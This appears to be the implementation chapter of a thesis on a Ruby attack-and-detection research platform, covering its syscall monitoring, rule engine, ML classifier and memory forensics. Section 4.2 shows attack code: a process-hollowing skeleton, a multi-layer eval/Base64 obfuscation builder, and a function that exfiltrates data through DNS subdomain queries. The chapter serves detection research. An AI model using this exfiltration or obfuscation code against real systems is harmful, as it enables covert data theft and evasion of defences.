# Chapter 4: Implementation

## 4.1 Technology Stack

RubyGuardian is implemented using a dual-language approach:

| Component          | Language | Key Libraries/Frameworks                    |
|--------------------|----------|---------------------------------------------|
| Attack Framework   | Ruby     | fiddle, socket, base64, openssl             |
| Detection Engine   | Ruby     | rb-inotify, sys-proctable, yaml            |
| Memory Forensics   | Ruby     | bindata, stringio, digest                   |
| Honeypot           | Ruby     | sinatra, webrick, sequel                    |
| ML Classifier      | Python   | scikit-learn, numpy, pandas, joblib         |
| Dashboard Backend  | Python   | FastAPI, websockets, uvicorn                |
| Dashboard Frontend | JS/React | React 18, Vite, Tailwind CSS               |
| Infrastructure     | Docker   | Docker Compose, Elasticsearch 8.12, Kibana  |

## 4.2 Attack Framework Implementation

### 4.2.1 Process Hollowing (T1055.012)

The process hollowing module creates a legitimate Ruby process, suspends it using ptrace, unmaps its original code section, and injects malicious shellcode:

```ruby
# frozen_string_literal: true

module RubyGuardian
  module Attack
    class ProcessHollower
      PTRACE_ATTACH  = 16
      PTRACE_DETACH  = 17
      PTRACE_POKETEXT = 4

      def initialize(target_pid)
        @target_pid = target_pid
        @libc = Fiddle.dlopen('libc.so.6')
        @ptrace = Fiddle::Function.new(@libc['ptrace'], [...], Fiddle::TYPE_LONG)
      end

      def hollow_and_inject(shellcode)
        attach_to_target
        write_shellcode(shellcode)
        detach_from_target
      end
    end
  end
end
```

The implementation handles memory alignment requirements, page boundary calculations, and proper ptrace error handling. A companion cleanup module restores the original process memory to avoid detection through crash-based indicators.

### 4.2.2 eval() Chain Exploitation (T1059.005)

The eval chain module constructs multi-stage payloads where each stage decodes and evaluates the next:

```ruby
def build_eval_chain(payload, depth: 3)
  encoded = payload
  depth.times do |i|
    encoded = Base64.strict_encode64(encoded)
    encoded = "eval(Base64.decode64('#{encoded}'))"
  end
  encoded
end
```

Obfuscation layers include Base64 encoding, XOR encryption with random keys, string concatenation splitting, and Unicode escape sequences. These techniques model real-world attack patterns observed in malicious RubyGems.

### 4.2.3 DNS Exfiltration (T1071.004)

The DNS exfiltration module encodes data in subdomain labels of DNS queries:

```ruby
def exfiltrate_via_dns(data, domain)
  chunks = data.scan(/.{1,63}/)
  chunks.each_with_index do |chunk, idx|
    encoded = Base32.encode(chunk).downcase.delete('=')
    query = "#{encoded}.#{idx}.#{domain}"
    Resolv::DNS.new.getresource(query, Resolv::DNS::Resource::IN::A)
  end
end
```

The implementation respects DNS label length limits (63 characters) and total query name limits (253 characters), and supports both sequential and randomized transmission modes.

## 4.3 Detection Engine Implementation

### 4.3.1 Syscall Monitor

The syscall monitor attaches to target processes using ptrace and intercepts system calls at both entry and exit:

```ruby
def monitor_syscalls(pid)
  Process.waitpid(pid)
  loop do
    Ptrace.syscall(pid, 0)
    Process.waitpid(pid)
    regs = Ptrace.getregs(pid)
    event = build_event(regs)
    @event_queue.push(event)
  end
end
```

Events are pushed to an internal queue for asynchronous processing by the rule engine. This decoupled design prevents detection latency from impacting the monitored process's execution speed.

### 4.3.2 Rule Engine

The rule engine loads YAML rule definitions at startup and maintains a trie-based index for efficient matching:

```ruby
def evaluate(event)
  applicable_rules = @rule_index[event[:type]] || []
  applicable_rules.each do |rule|
    if matches_all_conditions?(event, rule.conditions)
      alert = build_alert(event, rule)
      execute_actions(alert, rule.actions)
    end
  end
end
```

Rule hot-reloading is supported via filesystem watching (rb-inotify), enabling rule updates without system restart.

### 4.3.3 Correlation Engine

The correlation engine maintains a sliding window of events indexed by process group:

```ruby
def correlate(event)
  pgid = Process.getpgid(event[:pid])
  window = @windows[pgid] ||= CorrelationWindow.new(ttl: @config[:window_seconds])
  window.add(event)

  @chain_patterns.each do |pattern|
    if pattern.matches?(window.events)
      escalated = build_correlated_alert(window.events, pattern)
      emit_alert(escalated)
    end
  end
end
```

Windows are automatically expired using a background timer thread to prevent memory growth.

## 4.4 ML Classifier Implementation

### 4.4.1 Feature Extraction Pipeline

Feature extraction processes raw event streams into fixed-dimension feature vectors:

```python
class FeatureExtractor:
    def extract(self, events: list[dict]) -> np.ndarray:
        features = np.zeros(47)
        # Syscall frequency features (indices 0-19)
        syscall_counts = Counter(e['syscall'] for e in events)
        for i, syscall in enumerate(MONITORED_SYSCALLS):
            features[i] = syscall_counts.get(syscall, 0)
        # Network features (indices 20-34)
        net_events = [e for e in events if e['type'] == 'network']
        features[20] = len(set(e['dst_ip'] for e in net_events))
        features[21] = self._compute_dns_entropy(net_events)
        # Process features (indices 35-46)
        features[35] = len(set(e['pid'] for e in events))
        return features
```

### 4.4.2 Model Training

The training pipeline implements stratified cross-validation with hyperparameter tuning:

```python
def train(self, X: np.ndarray, y: np.ndarray) -> RandomForestClassifier:
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, stratify=y, random_state=42
    )
    scaler = StandardScaler()
    X_train_scaled = scaler.fit_transform(X_train)

    model = RandomForestClassifier(
        n_estimators=200, max_depth=20, min_samples_leaf=5,
        class_weight='balanced', random_state=42, n_jobs=-1
    )
    model.fit(X_train_scaled, y_train)
    return model
```

### 4.4.3 Real-Time Inference

The classifier exposes a FastAPI endpoint for real-time inference with sub-10ms latency:

```python
@app.post("/classify")
async def classify(event_batch: EventBatch) -> ClassificationResult:
    features = extractor.extract(event_batch.events)
    prediction = model.predict_proba(features.reshape(1, -1))
    return ClassificationResult(
        malicious_probability=prediction[0][1],
        confidence=max(prediction[0]),
        top_features=get_top_contributing_features(features)
    )
```

## 4.5 Memory Forensics Implementation

### 4.5.1 Memory Dumper

The memory dumper reads process memory through the /proc filesystem:

```ruby
def dump_process_memory(pid)
  regions = parse_proc_maps(pid)
  dump = MemoryDump.new(pid: pid, timestamp: Time.now.utc)

  regions.each do |region|
    next unless should_dump?(region)
    data = read_memory_region(pid, region.start_addr, region.size)
    region.entropy = compute_shannon_entropy(data)
    region.data = data
    dump.add_region(region)
  end

  dump.checksum = Digest::SHA256.hexdigest(dump.serialize)
  dump
end
```

### 4.5.2 IOC Extractor

The IOC extractor identifies indicators of compromise using pattern matching:

```ruby
IOC_PATTERNS = {
  ip: /\b(?:\d{1,3}\.){3}\d{1,3}\b/,
  domain: /\b[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.[a-z]{2,}\b/i,
  url: %r{https?://[^\s"'<>]+},
  hash_md5: /\b[a-f0-9]{32}\b/i,
  hash_sha256: /\b[a-f0-9]{64}\b/i,
  email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z]{2,}\b/i,
}.freeze
```

## 4.6 Dashboard Implementation

### 4.6.1 Frontend Architecture

The React frontend uses functional components with hooks for state management. Key architectural decisions:

- **Vite** for build tooling with hot module replacement
- **Tailwind CSS** for utility-first styling with a custom dark theme
- **WebSocket hooks** for real-time event streaming
- **React Error Boundaries** for graceful error handling

### 4.6.2 Real-Time Updates

The WebSocket service implements automatic reconnection with exponential backoff:

```javascript
class WebSocketClient {
  connect() {
    this.ws = new WebSocket(this.url);
    this.ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      this.emit('message', data);
    };
    this.ws.onclose = () => {
      if (!this.intentionalClose) this.scheduleReconnect();
    };
  }
}
```

## 4.7 ELK Stack Configuration

### 4.7.1 Logstash Pipelines

Three separate Logstash pipelines ingest data from different sources:

1. **Agent Pipeline** (port 5044): Detection engine events
2. **Honeypot Pipeline** (port 5045): Honeypot interaction captures
3. **Forensics Pipeline** (port 5046): Forensic analysis reports

Each pipeline applies source-specific parsing, enrichment (GeoIP, MITRE mapping), and output to Elasticsearch.

### 4.7.2 Elasticsearch Index Templates

Custom index templates define field mappings optimized for security event queries, including keyword fields for exact matching on IOCs and IP addresses.

## 4.8 Summary

This chapter detailed the implementation of RubyGuardian's six subsystems. The attack framework provides 12 Ruby-specific attack techniques. The detection engine processes events through signatures, heuristics, and correlation. The ML classifier extracts 47 features and achieves real-time classification. Memory forensics captures and analyzes process memory. The dashboard presents actionable visualizations. The following chapter evaluates the system's detection effectiveness and performance.
